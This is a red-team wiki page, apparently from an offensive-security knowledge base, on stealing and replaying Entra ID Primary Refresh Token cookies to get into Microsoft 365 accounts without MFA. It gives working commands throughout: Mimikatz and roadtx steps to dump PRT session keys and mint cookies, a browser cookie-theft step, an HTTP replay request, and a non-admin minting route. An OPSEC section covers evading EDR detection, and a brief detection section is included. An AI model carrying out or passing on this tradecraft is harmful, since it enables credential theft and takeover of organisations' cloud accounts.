---
title: Entra PRT cookie theft (x-ms-RefreshTokenCredential)
slug: entra-prt-cookie-theft
aliases: [prt-cookie, x-ms-refreshtokencredential, prt-theft]
---

> **TL;DR:** A domain-joined or Entra-joined Windows host caches a Primary Refresh Token (PRT) bound to the TPM/CloudAP. You can't lift the PRT itself without the device key, but you *can* lift a short-lived `x-ms-RefreshTokenCredential` cookie (or request one) and replay it from anywhere to silently SSO into M365 — bypassing MFA and most Conditional Access. Distinct from [[entra-device-code-prt-pivot]], which phishes a fresh PRT instead of stealing the live one.

## Mental model

When a user signs in to a domain/Entra-joined Windows host, the **Cloud Authentication Provider** (CloudAP / aadcloudap.dll inside `lsass`) does the OAuth dance, gets a PRT, and stores its session key wrapped against the device transport key (TPM-backed when available). Every browser SSO request to `login.microsoftonline.com` triggers a COM handshake with CloudAP that produces a **PRT cookie** (`x-ms-RefreshTokenCredential`), a JWT signed with the session key including a `nonce` from the STS. The cookie is the SSO primitive — browsers (Edge, Chrome with WAM) pass it in the `Cookie:` header on first hit, and the STS hands back a session.

Three attack shapes:

1. **Cookie sniff** — capture the live `x-ms-RefreshTokenCredential` in the browser session (DPAPI cookie jar, EDR-friendly).
2. **CloudAP mint** — with SYSTEM, ask CloudAP to mint a fresh PRT cookie via `BCryptDecrypt`/`Personal Token Broker` calls. Mimikatz `dpapi::cloudapkd` + `sekurlsa::cloudap`.
3. **Device key export** — pull TPM-bound transport key (TPM 1.2 / soft-bound 2.0 only) to mint cookies offline indefinitely. ROADtools `roadtx prtenrich`/`prtmint`.

## Preconditions

- Local admin on a Windows 10/11 host that is Entra-joined or Hybrid-joined.
- SYSTEM for CloudAP RPC (token impersonation works).
- For TPM-backed devices (default since Win11 + TPM 2.0 attested): the session key is non-exportable, but you can still **mint** cookies on-host. Offline replay needs the cookie *and* a usable nonce.
- For non-TPM / soft binding: full device key export → unlimited offline cookies.

## Tradecraft

### Live mint with SYSTEM

```cmd
:: Mimikatz — print the PRT, derived session key, KeyValue, and tenant info
privilege::debug
sekurlsa::cloudap
:: Output:
::   Prt              : <base64 PRT>
::   ClearKey         : <if non-TPM>
::   DerivedKey       : <hex>
::   Context          : <hex nonce>
```

```powershell
# ROADtools roadtx — fetch nonce, build cookie, exchange for tokens
roadtx prtenrich --prt <prt_b64> --prt-sessionkey <key_hex>
roadtx browserprtauth --prt <prt_b64> --prt-sessionkey <key_hex> -r https://graph.microsoft.com
# Browser-flow exchange yields an access + refresh token; refresh is FOCI — see [[oauth-foci-family-of-client-ids-abuse]]
```

### Cookie capture

```powershell
# Lift from running Edge/Chrome (current user) — DPAPI unwrap of cookies DB
# (Cookies live in: %LOCALAPPDATA%\Microsoft\Edge\User Data\Default\Network\Cookies)
SharpChromium.exe cookies edge
# Filter for 'login.microsoftonline.com' → 'x-ms-RefreshTokenCredential' (5-min TTL)
```

### Cross-device replay

Replay the cookie (still valid) in any browser:

```http
GET /common/oauth2/authorize?... HTTP/1.1
Host: login.microsoftonline.com
Cookie: x-ms-RefreshTokenCredential=<jwt>
```

STS treats your foreign IP as the legitimate device — Conditional Access "compliant device" claim is set if the original device satisfied it. The session that comes back is full M365 access for the cookie's lifetime, plus a refresh token that survives long after the PRT cookie expires.

### TPM-bound mint without admin

CVE-2023-35633 and follow-ups in 2024 demonstrated user-context COM calls to `BrowserCore.exe` / `CloudExperienceHostBroker` that mint PRT cookies *without* SYSTEM. Not patched on all Win10 builds. ROADtools' `roadtx winhello` flow demonstrates the minting from a non-admin context.

## Detection / Telemetry

- **Entra sign-in logs**: PRT-based sign-ins emit `Authentication Method` = `Previously satisfied` and `Token Issuer Type` = `AzureAD`. Replay from a foreign country shows the original device's `Device ID` with a mismatched IP → classic UEBA signal.
- **AAD risk events**: "Anonymous IP address", "Unfamiliar sign-in properties", "Token issuer anomaly". Risky sign-in policy + sign-in risk High = blocks.
- **Defender for Endpoint**: `Behavior:Win32/Cloudap.A` for Mimikatz `cloudap` usage; LSASS read with `0x0010` ACCESS_MASK from non-Microsoft signer.
- **MDE** / **MD for Identity** correlate device ID seen on impossible-travel.

## OPSEC pitfalls

- The PRT cookie lifetime is short (~5 min). Mint just-in-time per resource, don't stockpile.
- The cookie binds to the *original* `tenantBrandingId` and includes `DeviceID`. Tenants with risk-based CA fire on `compliantDevice=true` from an IP outside the device's normal geos.
- Mimikatz `sekurlsa::cloudap` triggers high-confidence LSASS read signatures on all modern EDR. Use `Nanodump` + offline `pypykatz cloudap`, or BOFs that touch CloudAP directly.
- TPM-attested PRT cookies include a `tpm_attestation` claim. Sign-in logs flag missing/invalid attestation. Replay survives but is forensically obvious post-hoc.
- A WHfB key registered for the device puts an `amr: ["pwd","mfa"]` claim in tokens minted via PRT — replayed tokens look fully MFA'd, which is the whole point but also makes the abuse hard to spot without sign-in-log review.
- Killing the user's session by force-rolling MFA / "Revoke sessions" in admin centre invalidates **refresh tokens** but the *issued access tokens* and cached refresh tokens you've already exchanged remain live until expiry (typ. 60–90 min access, 14-90 day refresh).

## References

- https://posts.specterops.io/requesting-azure-ad-request-tokens-on-azure-ad-joined-machines-for-browser-sso-2b0409caad30
- https://dirkjanm.io/abusing-azure-ad-sso-with-the-primary-refresh-token/
- https://github.com/dirkjanm/ROADtools
- https://github.com/leechristensen/RequestAADRefreshToken
- https://learn.microsoft.com/en-us/entra/identity/devices/concept-primary-refresh-token
- https://research.ifcr.dk/the-art-of-stealing-the-primary-refresh-token-77abd2a09ad9

See also: [[entra-device-code-prt-pivot]], [[oauth-foci-family-of-client-ids-abuse]], [[az-cli-tokens]], [[conditional-access-bypass-modern]], [[entra-conditional-access-bypass]], [[graphrunner-msgraph-redteam]], [[token-stealing-cloud]], [[dpapi-secrets]]
